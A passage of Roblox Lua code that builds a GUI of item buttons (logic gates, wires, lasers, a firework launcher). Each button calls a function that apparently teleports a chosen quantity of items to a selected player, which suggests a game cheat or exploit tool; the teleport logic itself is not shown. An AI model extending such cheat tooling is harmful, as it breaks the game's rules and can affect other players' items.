ChopSaw.MouseButton1Down:connect(function()
Type.Text = "Chop Saw"
SingleItemTpQty("ChopSaw", PlyrSelz.Text, qty.Text)
end)

CountItems90 = Instance.new("TextLabel")
CountItems90.Parent = MoveWire
CountItems90.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems90.BackgroundTransparency = 0.6
CountItems90.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems90.Position = UDim2.new(0, 110, 0, 370)
CountItems90.Size = UDim2.new(0, 25, 0, 20)
CountItems90.Font = Enum.Font.SourceSans
CountItems90.Text = "0"
CountItems90.TextColor3 = Color3.new(0, 1, 0)
CountItems90.TextSize = 25

PressurePlate = Instance.new("ImageButton")
PressurePlate.Name = "PressurePlate"
PressurePlate.Parent = MoveWire
PressurePlate.BackgroundColor3 = Color3.new(1, 1, 1)
PressurePlate.BackgroundTransparency = 1
PressurePlate.BorderColor3 = Color3.new(0.6, 0, 0)
PressurePlate.Position = UDim2.new(0, 5, 0, 420)
PressurePlate.Size = UDim2.new(0, 100, 0, 100)
PressurePlate.Image = "rbxassetid://3709111292"
PressurePlate.MouseButton1Down:connect(function()
Type.Text = "Pressure Plate"
SingleItemTpQty("PressurePlate", PlyrSelz.Text, qty.Text)
end)

CountItems91 = Instance.new("TextLabel")
CountItems91.Parent = MoveWire
CountItems91.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems91.BackgroundTransparency = 0.6
CountItems91.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems91.Position = UDim2.new(0, 110, 0, 475)
CountItems91.Size = UDim2.new(0, 25, 0, 20)
CountItems91.Font = Enum.Font.SourceSans
CountItems91.Text = "0"
CountItems91.TextColor3 = Color3.new(0, 1, 0)
CountItems91.TextSize = 25

SignalSustain = Instance.new("ImageButton")
SignalSustain.Name = "SignalSustain"
SignalSustain.Parent = MoveWire
SignalSustain.BackgroundColor3 = Color3.new(1, 1, 1)
SignalSustain.BackgroundTransparency = 1
SignalSustain.BorderColor3 = Color3.new(0.6, 0, 0)
SignalSustain.Position = UDim2.new(0, 5, 0, 525)
SignalSustain.Size = UDim2.new(0, 100, 0, 100)
SignalSustain.Image = "rbxassetid://3709111644"
SignalSustain.MouseButton1Down:connect(function()
Type.Text = "Signal Sustain"
SingleItemTpQty("SignalSustain", PlyrSelz.Text, qty.Text)
end)

CountItems92 = Instance.new("TextLabel")
CountItems92.Parent = MoveWire
CountItems92.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems92.BackgroundTransparency = 0.6
CountItems92.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems92.Position = UDim2.new(0, 110, 0, 580)
CountItems92.Size = UDim2.new(0, 25, 0, 20)
CountItems92.Font = Enum.Font.SourceSans
CountItems92.Text = "0"
CountItems92.TextColor3 = Color3.new(0, 1, 0)
CountItems92.TextSize = 25

Laser = Instance.new("ImageButton")
Laser.Name = "Laser"
Laser.Parent = MoveWire
Laser.BackgroundColor3 = Color3.new(1, 1, 1)
Laser.BackgroundTransparency = 1
Laser.BorderColor3 = Color3.new(0.6, 0, 0)
Laser.Position = UDim2.new(0, 5, 0, 630)
Laser.Size = UDim2.new(0, 100, 0, 100)
Laser.Image = "rbxassetid://3709106668"
Laser.MouseButton1Down:connect(function()
SingleItemTpQty("Laser", PlyrSelz.Text, qty.Text)
Type.Text = "Laser"
end)

CountItems93 = Instance.new("TextLabel")
CountItems93.Parent = MoveWire
CountItems93.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems93.BackgroundTransparency = 0.6
CountItems93.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems93.Position = UDim2.new(0, 110, 0, 685)
CountItems93.Size = UDim2.new(0, 25, 0, 20)
CountItems93.Font = Enum.Font.SourceSans
CountItems93.Text = "0"
CountItems93.TextColor3 = Color3.new(0, 1, 0)
CountItems93.TextSize = 25

LaserReceiver = Instance.new("ImageButton")
LaserReceiver.Name = "LaserReceiver"
LaserReceiver.Parent = MoveWire
LaserReceiver.BackgroundColor3 = Color3.new(1, 1, 1)
LaserReceiver.BackgroundTransparency = 1
LaserReceiver.BorderColor3 = Color3.new(0.6, 0, 0)
LaserReceiver.Position = UDim2.new(0, 5, 0, 735)
LaserReceiver.Size = UDim2.new(0, 100, 0, 100)
LaserReceiver.Image = "rbxassetid://3709107170"
LaserReceiver.MouseButton1Down:connect(function()
Type.Text = "Laser Receiver"
SingleItemTpQty("LaserReceiver", PlyrSelz.Text, qty.Text)
end)

CountItems94 = Instance.new("TextLabel")
CountItems94.Parent = MoveWire
CountItems94.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems94.BackgroundTransparency = 0.6
CountItems94.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems94.Position = UDim2.new(0, 110, 0, 790)
CountItems94.Size = UDim2.new(0, 25, 0, 20)
CountItems94.Font = Enum.Font.SourceSans
CountItems94.Text = "0"
CountItems94.TextColor3 = Color3.new(0, 1, 0)
CountItems94.TextSize = 25

Hatch = Instance.new("ImageButton")
Hatch.Name = "Hatch"
Hatch.Parent = MoveWire
Hatch.BackgroundColor3 = Color3.new(1, 1, 1)
Hatch.BackgroundTransparency = 1
Hatch.BorderColor3 = Color3.new(0.6, 0, 0)
Hatch.Position = UDim2.new(0, 5, 0, 840)
Hatch.Size = UDim2.new(0, 100, 0, 100)
Hatch.Image = "rbxassetid://3709104176"
Hatch.MouseButton1Down:connect(function()
Type.Text = "Hatch"
SingleItemTpQty("Hatch", PlyrSelz.Text, qty.Text)
end)

CountItems95 = Instance.new("TextLabel")
CountItems95.Parent = MoveWire
CountItems95.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems95.BackgroundTransparency = 0.6
CountItems95.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems95.Position = UDim2.new(0, 110, 0, 895)
CountItems95.Size = UDim2.new(0, 25, 0, 20)
CountItems95.Font = Enum.Font.SourceSans
CountItems95.Text = "0"
CountItems95.TextColor3 = Color3.new(0, 1, 0)
CountItems95.TextSize = 25

GateNOT = Instance.new("ImageButton")
GateNOT.Name = "GateNOT"
GateNOT.Parent = MoveWire
GateNOT.BackgroundColor3 = Color3.new(1, 1, 1)
GateNOT.BackgroundTransparency = 1
GateNOT.BorderColor3 = Color3.new(0.6, 0, 0)
GateNOT.Position = UDim2.new(0, 5, 0, 945)
GateNOT.Size = UDim2.new(0, 100, 0, 100)
GateNOT.Image = "rbxassetid://3709182645"
GateNOT.MouseButton1Down:connect(function()
Type.Text = "NOT Gate"
SingleItemTpQty("GateNOT", PlyrSelz.Text, qty.Text)
end)

CountItems96 = Instance.new("TextLabel")
CountItems96.Parent = MoveWire
CountItems96.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems96.BackgroundTransparency = 0.6
CountItems96.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems96.Position = UDim2.new(0, 110, 0, 1000)
CountItems96.Size = UDim2.new(0, 25, 0, 20)
CountItems96.Font = Enum.Font.SourceSans
CountItems96.Text = "0"
CountItems96.TextColor3 = Color3.new(0, 1, 0)
CountItems96.TextSize = 25

GateOR = Instance.new("ImageButton")
GateOR.Name = "GateOR"
GateOR.Parent = MoveWire
GateOR.BackgroundColor3 = Color3.new(1, 1, 1)
GateOR.BackgroundTransparency = 1
GateOR.BorderColor3 = Color3.new(0.6, 0, 0)
GateOR.Position = UDim2.new(0, 5, 0, 1050)
GateOR.Size = UDim2.new(0, 100, 0, 100)
GateOR.Image = "rbxassetid://3709103299"
GateOR.MouseButton1Down:connect(function()
Type.Text = "OR Gate"
SingleItemTpQty("GateOR", PlyrSelz.Text, qty.Text)
end)

CountItems97 = Instance.new("TextLabel")
CountItems97.Parent = MoveWire
CountItems97.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems97.BackgroundTransparency = 0.6
CountItems97.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems97.Position = UDim2.new(0, 110, 0, 1105)
CountItems97.Size = UDim2.new(0, 25, 0, 20)
CountItems97.Font = Enum.Font.SourceSans
CountItems97.Text = "0"
CountItems97.TextColor3 = Color3.new(0, 1, 0)
CountItems97.TextSize = 25

GateAND = Instance.new("ImageButton")
GateAND.Name = "GateAND"
GateAND.Parent = MoveWire
GateAND.BackgroundColor3 = Color3.new(1, 1, 1)
GateAND.BackgroundTransparency = 1
GateAND.BorderColor3 = Color3.new(0.6, 0, 0)
GateAND.Position = UDim2.new(0, 5, 0, 1155)
GateAND.Size = UDim2.new(0, 100, 0, 100)
GateAND.Image = "rbxassetid://3709102307"
GateAND.MouseButton1Down:connect(function()
Type.Text = "AND Gate"
SingleItemTpQty("GateAND", PlyrSelz.Text, qty.Text)
end)

CountItems98 = Instance.new("TextLabel")
CountItems98.Parent = MoveWire
CountItems98.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems98.BackgroundTransparency = 0.6
CountItems98.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems98.Position = UDim2.new(0, 110, 0, 1210)
CountItems98.Size = UDim2.new(0, 25, 0, 20)
CountItems98.Font = Enum.Font.SourceSans
CountItems98.Text = "0"
CountItems98.TextColor3 = Color3.new(0, 1, 0)
CountItems98.TextSize = 25

GateXOR = Instance.new("ImageButton")
GateXOR.Name = "GateXOR"
GateXOR.Parent = MoveWire
GateXOR.BackgroundColor3 = Color3.new(1, 1, 1)
GateXOR.BackgroundTransparency = 1
GateXOR.BorderColor3 = Color3.new(0.6, 0, 0)
GateXOR.Position = UDim2.new(0, 5, 0, 1260)
GateXOR.Size = UDim2.new(0, 100, 0, 100)
GateXOR.Image = "rbxassetid://3709103653"
GateXOR.MouseButton1Down:connect(function()
Type.Text = "XOR Gate"
SingleItemTpQty("GateXOR", PlyrSelz.Text, qty.Text)
end)

CountItems99 = Instance.new("TextLabel")
CountItems99.Parent = MoveWire
CountItems99.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems99.BackgroundTransparency = 0.6
CountItems99.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems99.Position = UDim2.new(0, 110, 0, 1315)
CountItems99.Size = UDim2.new(0, 25, 0, 20)
CountItems99.Font = Enum.Font.SourceSans
CountItems99.Text = "0"
CountItems99.TextColor3 = Color3.new(0, 1, 0)
CountItems99.TextSize = 25

WoodChecker = Instance.new("ImageButton")
WoodChecker.Name = "WoodChecker"
WoodChecker.Parent = MoveWire
WoodChecker.BackgroundColor3 = Color3.new(1, 1, 1)
WoodChecker.BackgroundTransparency = 1
WoodChecker.BorderColor3 = Color3.new(0.6, 0, 0)
WoodChecker.Position = UDim2.new(0, 5, 0, 1365)
WoodChecker.Size = UDim2.new(0, 100, 0, 100)
WoodChecker.Image = "rbxassetid://3709113088"
WoodChecker.MouseButton1Down:connect(function()
Type.Text = "Wood Detector"
SingleItemTpQty("WoodChecker", PlyrSelz.Text, qty.Text)
end)

CountItems100 = Instance.new("TextLabel")
CountItems100.Parent = MoveWire
CountItems100.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems100.BackgroundTransparency = 0.6
CountItems100.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems100.Position = UDim2.new(0, 110, 0, 1420)
CountItems100.Size = UDim2.new(0, 25, 0, 20)
CountItems100.Font = Enum.Font.SourceSans
CountItems100.Text = "0"
CountItems100.TextColor3 = Color3.new(0, 1, 0)
CountItems100.TextSize = 25

SignalDelay = Instance.new("ImageButton")
SignalDelay.Name = "SignalDelay"
SignalDelay.Parent = MoveWire
SignalDelay.BackgroundColor3 = Color3.new(1, 1, 1)
SignalDelay.BackgroundTransparency = 1
SignalDelay.BorderColor3 = Color3.new(0.6, 0, 0)
SignalDelay.Position = UDim2.new(0, 5, 0, 1470)
SignalDelay.Size = UDim2.new(0, 100, 0, 100)
SignalDelay.Image = "rbxassetid://3709111644"
SignalDelay.MouseButton1Down:connect(function()
Type.Text = "Signal Delay"
SingleItemTpQty("SignalDelay", PlyrSelz.Text, qty.Text)
end)

CountItems101 = Instance.new("TextLabel")
CountItems101.Parent = MoveWire
CountItems101.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems101.BackgroundTransparency = 0.6
CountItems101.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems101.Position = UDim2.new(0, 110, 0, 1525)
CountItems101.Size = UDim2.new(0, 25, 0, 20)
CountItems101.Font = Enum.Font.SourceSans
CountItems101.Text = "0"
CountItems101.TextColor3 = Color3.new(0, 1, 0)
CountItems101.TextSize = 25

NeonWireRed = Instance.new("ImageButton")
NeonWireRed.Name = "NeonWireRed"
NeonWireRed.Parent = MoveWire
NeonWireRed.BackgroundColor3 = Color3.new(1, 1, 1)
NeonWireRed.BackgroundTransparency = 1
NeonWireRed.BorderColor3 = Color3.new(0.6, 0, 0)
NeonWireRed.Position = UDim2.new(0, 5, 0, 1575)
NeonWireRed.Size = UDim2.new(0, 100, 0, 100)
NeonWireRed.Image = "rbxassetid://3709109941"
NeonWireRed.MouseButton1Down:connect(function()
Type.Text = "Neon Wire Red"
SingleItemTpQty("NeonWireRed", PlyrSelz.Text, qty.Text)
end)

CountItems102 = Instance.new("TextLabel")
CountItems102.Parent = MoveWire
CountItems102.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems102.BackgroundTransparency = 0.6
CountItems102.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems102.Position = UDim2.new(0, 110, 0, 1630)
CountItems102.Size = UDim2.new(0, 25, 0, 20)
CountItems102.Font = Enum.Font.SourceSans
CountItems102.Text = "0"
CountItems102.TextColor3 = Color3.new(0, 1, 0)
CountItems102.TextSize = 25

NeonWireOrange = Instance.new("ImageButton")
NeonWireOrange.Name = "NeonWireOrange"
NeonWireOrange.Parent = MoveWire
NeonWireOrange.BackgroundColor3 = Color3.new(1, 1, 1)
NeonWireOrange.BackgroundTransparency = 1
NeonWireOrange.BorderColor3 = Color3.new(0.6, 0, 0)
NeonWireOrange.Position = UDim2.new(0, 5, 0, 1680)
NeonWireOrange.Size = UDim2.new(0, 100, 0, 100)
NeonWireOrange.Image = "rbxassetid://3709109310"
NeonWireOrange.MouseButton1Down:connect(function()
Type.Text = "Neon Wire Orange"
SingleItemTpQty("NeonWireOrange", PlyrSelz.Text, qty.Text)
end)

CountItems103 = Instance.new("TextLabel")
CountItems103.Parent = MoveWire
CountItems103.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems103.BackgroundTransparency = 0.6
CountItems103.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems103.Position = UDim2.new(0, 110, 0, 1735)
CountItems103.Size = UDim2.new(0, 25, 0, 20)
CountItems103.Font = Enum.Font.SourceSans
CountItems103.Text = "0"
CountItems103.TextColor3 = Color3.new(0, 1, 0)
CountItems103.TextSize = 25

NeonWireYellow = Instance.new("ImageButton")
NeonWireYellow.Name = "NeonWireYellow"
NeonWireYellow.Parent = MoveWire
NeonWireYellow.BackgroundColor3 = Color3.new(1, 1, 1)
NeonWireYellow.BackgroundTransparency = 1
NeonWireYellow.BorderColor3 = Color3.new(0.6, 0, 0)
NeonWireYellow.Position = UDim2.new(0, 5, 0, 1785)
NeonWireYellow.Size = UDim2.new(0, 100, 0, 100)
NeonWireYellow.Image = "rbxassetid://3709110967"
NeonWireYellow.MouseButton1Down:connect(function()
Type.Text = "Neon Wire Yellow"
SingleItemTpQty("NeonWireYellow", PlyrSelz.Text, qty.Text)
end)

CountItems104 = Instance.new("TextLabel")
CountItems104.Parent = MoveWire
CountItems104.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems104.BackgroundTransparency = 0.6
CountItems104.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems104.Position = UDim2.new(0, 110, 0, 1840)
CountItems104.Size = UDim2.new(0, 0, 0, 35)
CountItems104.Font = Enum.Font.SourceSans
CountItems104.Text = "0"
CountItems104.TextColor3 = Color3.new(0, 1, 0)
CountItems104.TextSize = 25

NeonWireGreen = Instance.new("ImageButton")
NeonWireGreen.Name = "FillCaveCrawler"
NeonWireGreen.Parent = MoveWire
NeonWireGreen.BackgroundColor3 = Color3.new(1, 1, 1)
NeonWireGreen.BackgroundTransparency = 1
NeonWireGreen.BorderColor3 = Color3.new(0.6, 0, 0)
NeonWireGreen.Position = UDim2.new(0, 5, 0, 1890)
NeonWireGreen.Size = UDim2.new(0, 100, 0, 100)
NeonWireGreen.Image = "rbxassetid://3709109003"
NeonWireGreen.MouseButton1Down:connect(function()
Type.Text = "Neon Wire Green"
SingleItemTpQty("NeonWireGreen", PlyrSelz.Text, qty.Text)
end)

CountItems105 = Instance.new("TextLabel")
CountItems105.Parent = MoveWire
CountItems105.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems105.BackgroundTransparency = 0.6
CountItems105.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems105.Position = UDim2.new(0,110, 0, 1945)
CountItems105.Size = UDim2.new(0, 25, 0, 20)
CountItems105.Font = Enum.Font.SourceSans
CountItems105.Text = "0"
CountItems105.TextColor3 = Color3.new(0, 1, 0)
CountItems105.TextSize = 25

NeonWireCyan = Instance.new("ImageButton")
NeonWireCyan.Name = "NeonWireCyan"
NeonWireCyan.Parent = MoveWire
NeonWireCyan.BackgroundColor3 = Color3.new(1, 1, 1)
NeonWireCyan.BackgroundTransparency = 1
NeonWireCyan.BorderColor3 = Color3.new(0.6, 0, 0)
NeonWireCyan.Position = UDim2.new(0, 5, 0, 1995)
NeonWireCyan.Size = UDim2.new(0, 100, 0, 100)
NeonWireCyan.Image = "rbxassetid://3709108577"
NeonWireCyan.MouseButton1Down:connect(function()
Type.Text = "Neon Wire Cyan"
SingleItemTpQty("NeonWireCyan", PlyrSelz.Text, qty.Text)
end)

CountItems106 = Instance.new("TextLabel")
CountItems106.Parent = MoveWire
CountItems106.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems106.BackgroundTransparency = 0.6
CountItems106.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems106.Position = UDim2.new(0, 110, 0, 2050)
CountItems106.Size = UDim2.new(0, 25, 0, 20)
CountItems106.Font = Enum.Font.SourceSans
CountItems106.Text = "0"
CountItems106.TextColor3 = Color3.new(0, 1, 0)
CountItems106.TextSize = 25

NeonWireBlue = Instance.new("ImageButton")
NeonWireBlue.Name = "NeonWireBlue"
NeonWireBlue.Parent = MoveWire
NeonWireBlue.BackgroundColor3 = Color3.new(1, 1, 1)
NeonWireBlue.BackgroundTransparency = 1
NeonWireBlue.BorderColor3 = Color3.new(0.6, 0, 0)
NeonWireBlue.Position = UDim2.new(0, 5, 0, 2100)
NeonWireBlue.Size = UDim2.new(0, 100, 0, 100)
NeonWireBlue.Image = "rbxassetid://3709108148"
NeonWireBlue.MouseButton1Down:connect(function()
Type.Text = "Neon Wire Blue"
SingleItemTpQty("NeonWireBlue", PlyrSelz.Text, qty.Text)
end)

CountItems107 = Instance.new("TextLabel")
CountItems107.Parent = MoveWire
CountItems107.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems107.BackgroundTransparency = 0.6
CountItems107.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems107.Position = UDim2.new(0, 110, 0, 2155)
CountItems107.Size = UDim2.new(0, 25, 0, 20)
CountItems107.Font = Enum.Font.SourceSans
CountItems107.Text = "0"
CountItems107.TextColor3 = Color3.new(0, 1, 0)
CountItems107.TextSize = 25

NeonWireViolet = Instance.new("ImageButton")
NeonWireViolet.Name = "NeonWireViolet"
NeonWireViolet.Parent = MoveWire
NeonWireViolet.BackgroundColor3 = Color3.new(1, 1, 1)
NeonWireViolet.BackgroundTransparency = 1
NeonWireViolet.BorderColor3 = Color3.new(0.6, 0, 0)
NeonWireViolet.Position = UDim2.new(0, 5, 0, 2205)
NeonWireViolet.Size = UDim2.new(0, 100, 0, 100)
NeonWireViolet.Image = "rbxassetid://3709110281"
NeonWireViolet.MouseButton1Down:connect(function()
Type.Text = "Neon Wire Violet"
SingleItemTpQty("NeonWireViolet", PlyrSelz.Text, qty.Text)
end)

CountItems108 = Instance.new("TextLabel")
CountItems108.Parent = MoveWire
CountItems108.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems108.BackgroundTransparency = 0.6
CountItems108.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems108.Position = UDim2.new(0, 110, 0, 2260)
CountItems108.Size = UDim2.new(0, 25, 0, 20)
CountItems108.Font = Enum.Font.SourceSans
CountItems108.Text = "0"
CountItems108.TextColor3 = Color3.new(0, 1, 0)
CountItems108.TextSize = 25

NeonWireWhite = Instance.new("ImageButton")
NeonWireWhite.Name = "NeonWireWhite"
NeonWireWhite.Parent = MoveWire
NeonWireWhite.BackgroundColor3 = Color3.new(1, 1, 1)
NeonWireWhite.BackgroundTransparency = 1
NeonWireWhite.BorderColor3 = Color3.new(0.6, 0, 0)
NeonWireWhite.Position = UDim2.new(0, 5, 0, 2310)
NeonWireWhite.Size = UDim2.new(0, 100, 0, 100)
NeonWireWhite.Image = "rbxassetid://3709110631"
NeonWireWhite.MouseButton1Down:connect(function()
Type.Text = "Neon Wire White"
SingleItemTpQty("NeonWireWhite", PlyrSelz.Text, qty.Text)
end)

CountItems109 = Instance.new("TextLabel")
CountItems109.Parent = MoveWire
CountItems109.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems109.BackgroundTransparency = 0.6
CountItems109.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems109.Position = UDim2.new(0, 110, 0, 2365)
CountItems109.Size = UDim2.new(0, 25, 0, 20)
CountItems109.Font = Enum.Font.SourceSans
CountItems109.Text = "0"
CountItems109.TextColor3 = Color3.new(0, 1, 0)
CountItems109.TextSize = 25

IcicleWireAmber = Instance.new("ImageButton")
IcicleWireAmber.Name = "IcicleWireAmber"
IcicleWireAmber.Parent = MoveWire
IcicleWireAmber.BackgroundColor3 = Color3.new(1, 1, 1)
IcicleWireAmber.BackgroundTransparency = 1
IcicleWireAmber.BorderColor3 = Color3.new(0.6, 0, 0)
IcicleWireAmber.Position = UDim2.new(0, 5, 0, 2415)
IcicleWireAmber.Size = UDim2.new(0, 100, 0, 100)
IcicleWireAmber.Image = "rbxassetid://3709104619"
IcicleWireAmber.MouseButton1Down:connect(function()
Type.Text = "Icicle Wire Amber"
SingleItemTpQty("IcicleWireAmber", PlyrSelz.Text, qty.Text)
end)

CountItems110 = Instance.new("TextLabel")
CountItems110.Parent = MoveWire
CountItems110.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems110.BackgroundTransparency = 0.6
CountItems110.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems110.Position = UDim2.new(0, 110, 0, 2470)
CountItems110.Size = UDim2.new(0, 25, 0, 20)
CountItems110.Font = Enum.Font.SourceSans
CountItems110.Text = "0"
CountItems110.TextColor3 = Color3.new(0, 1, 0)
CountItems110.TextSize = 25

IcicleWireRed = Instance.new("ImageButton")
IcicleWireRed.Name = "FillCaveCrawler"
IcicleWireRed.Parent = MoveWire
IcicleWireRed.BackgroundColor3 = Color3.new(1, 1, 1)
IcicleWireRed.BackgroundTransparency = 1
IcicleWireRed.BorderColor3 = Color3.new(0.6, 0, 0)
IcicleWireRed.Position = UDim2.new(0, 5, 0, 2520)
IcicleWireRed.Size = UDim2.new(0, 100, 0, 100)
IcicleWireRed.Image = "rbxassetid://3709106275"
IcicleWireRed.MouseButton1Down:connect(function()
Type.Text = "Icicle Wire Red"
SingleItemTpQty("IcicleWireRed", PlyrSelz.Text, qty.Text)
end)

CountItems111 = Instance.new("TextLabel")
CountItems111.Parent = MoveWire
CountItems111.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems111.BackgroundTransparency = 0.6
CountItems111.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems111.Position = UDim2.new(0, 110, 0, 2575)
CountItems111.Size = UDim2.new(0, 25, 0, 20)
CountItems111.Font = Enum.Font.SourceSans
CountItems111.Text = "0"
CountItems111.TextColor3 = Color3.new(0, 1, 0)
CountItems111.TextSize = 25

IcicleWireGreen = Instance.new("ImageButton")
IcicleWireGreen.Name = "IcicleWireGreen"
IcicleWireGreen.Parent = MoveWire
IcicleWireGreen.BackgroundColor3 = Color3.new(1, 1, 1)
IcicleWireGreen.BackgroundTransparency = 1
IcicleWireGreen.BorderColor3 = Color3.new(0.6, 0, 0)
IcicleWireGreen.Position = UDim2.new(0, 5, 0, 2625)
IcicleWireGreen.Size = UDim2.new(0, 100, 0, 100)
IcicleWireGreen.Image = "rbxassetid://3709105510"
IcicleWireGreen.MouseButton1Down:connect(function()
Type.Text = "Icicle Wire Green"
SingleItemTpQty("IcicleWireGreen", PlyrSelz.Text, qty.Text)
end)

CountItems112 = Instance.new("TextLabel")
CountItems112.Parent = MoveWire
CountItems112.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems112.BackgroundTransparency = 0.6
CountItems112.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems112.Position = UDim2.new(0, 110, 0, 2680)
CountItems112.Size = UDim2.new(0, 25, 0, 20)
CountItems112.Font = Enum.Font.SourceSans
CountItems112.Text = "0"
CountItems112.TextColor3 = Color3.new(0, 1, 0) 
CountItems112.TextSize = 25 

IcicleWireBlue = Instance.new("ImageButton") 
IcicleWireBlue.Name = "IcicleWireBlue"
IcicleWireBlue.Parent = MoveWire
IcicleWireBlue.BackgroundColor3 = Color3.new(1, 1, 1)
IcicleWireBlue.BackgroundTransparency = 1
IcicleWireBlue.BorderColor3 = Color3.new(0.6, 0, 0)
IcicleWireBlue.Position = UDim2.new(0, 5, 0, 2730)
IcicleWireBlue.Size = UDim2.new(0, 100, 0, 100)
IcicleWireBlue.Image = "rbxassetid://3709105145"
IcicleWireBlue.MouseButton1Down:connect(function()
Type.Text = "Icicle Wire Blue"
SingleItemTpQty("IcicleWireBlue", PlyrSelz.Text, qty.Text)
end)

CountItems113 = Instance.new("TextLabel")
CountItems113.Parent = MoveWire
CountItems113.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems113.BackgroundTransparency = 0.6
CountItems113.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems113.Position = UDim2.new(0, 110, 0, 2785)
CountItems113.Size = UDim2.new(0, 25, 0, 20)
CountItems113.Font = Enum.Font.SourceSans
CountItems113.Text = "0"
CountItems113.TextColor3 = Color3.new(0, 1, 0)
CountItems113.TextSize = 25

IcicleWireMagenta = Instance.new("ImageButton")
IcicleWireMagenta.Name = "IcicleWireMagenta"
IcicleWireMagenta.Parent = MoveWire
IcicleWireMagenta.BackgroundColor3 = Color3.new(1, 1, 1)
IcicleWireMagenta.BackgroundTransparency = 1
IcicleWireMagenta.BorderColor3 = Color3.new(0.6, 0, 0)
IcicleWireMagenta.Position = UDim2.new(0, 5, 0, 2835)
IcicleWireMagenta.Size = UDim2.new(0, 100, 0, 100)
IcicleWireMagenta.Image = "rbxassetid://3709104619"
IcicleWireMagenta.MouseButton1Down:connect(function()
Type.Text = "Icicle Wire Magenta"
SingleItemTpQty("IcicleWireMagenta", PlyrSelz.Text, qty.Text)
end)

CountItems114 = Instance.new("TextLabel")
CountItems114.Parent = MoveWire
CountItems114.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems114.BackgroundTransparency = 0.6
CountItems114.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems114.Position = UDim2.new(0, 110, 0, 2890)
CountItems114.Size = UDim2.new(0, 25, 0, 20)
CountItems114.Font = Enum.Font.SourceSans
CountItems114.Text = "0"
CountItems114.TextColor3 = Color3.new(0, 1, 0)
CountItems114.TextSize = 25

IcicleWireHalloween = Instance.new("ImageButton")
IcicleWireHalloween.Name = "IcicleWireHalloween"
IcicleWireHalloween.Parent = MoveWire
IcicleWireHalloween.BackgroundColor3 = Color3.new(1, 1, 1)
IcicleWireHalloween.BackgroundTransparency = 1
IcicleWireHalloween.BorderColor3 = Color3.new(0.6, 0, 0)
IcicleWireHalloween.Position = UDim2.new(0, 5, 0, 2940)
IcicleWireHalloween.Size = UDim2.new(0, 100, 0, 100)
IcicleWireHalloween.Image = "rbxassetid://4052284274"
IcicleWireHalloween.MouseButton1Down:connect(function()
Type.Text = "Icicle Wire Halloween"
SingleItemTpQty("IcicleWireHalloween", PlyrSelz.Text, qty.Text)
end)

CountItems115 = Instance.new("TextLabel")
CountItems115.Parent = MoveWire
CountItems115.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems115.BackgroundTransparency = 0.6
CountItems115.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems115.Position = UDim2.new(0, 110, 0, 2995)
CountItems115.Size = UDim2.new(0, 25, 0, 20)
CountItems115.Font = Enum.Font.SourceSans
CountItems115.Text = "0"
CountItems115.TextColor3 = Color3.new(0, 1, 0)
CountItems115.TextSize = 25

FireworkLauncher = Instance.new("ImageButton")
FireworkLauncher.Name = "FireworkLauncher"
FireworkLauncher.Parent = MoveWire
FireworkLauncher.BackgroundColor3 = Color3.new(1, 1, 1)
FireworkLauncher.BackgroundTransparency = 1
FireworkLauncher.BorderColor3 = Color3.new(0.6, 0, 0)
FireworkLauncher.Position = UDim2.new(0, 5, 0, 3045)
FireworkLauncher.Size = UDim2.new(0, 100, 0, 100)
FireworkLauncher.Image = "rbxassetid://3836070993"
FireworkLauncher.MouseButton1Down:connect(function()
Type.Text = "Firework Launcher"
SingleItemTpQty("FireworkLauncher", PlyrSelz.Text, qty.Text)
end)

CountItems116 = Instance.new("TextLabel")
CountItems116.Parent = MoveWire
CountItems116.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems116.BackgroundTransparency = 0.6
CountItems116.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems116.Position = UDim2.new(0, 110, 0, 3100)
CountItems116.Size = UDim2.new(0, 25, 0, 20)
CountItems116.Font = Enum.Font.SourceSans
CountItems116.Text = "0"
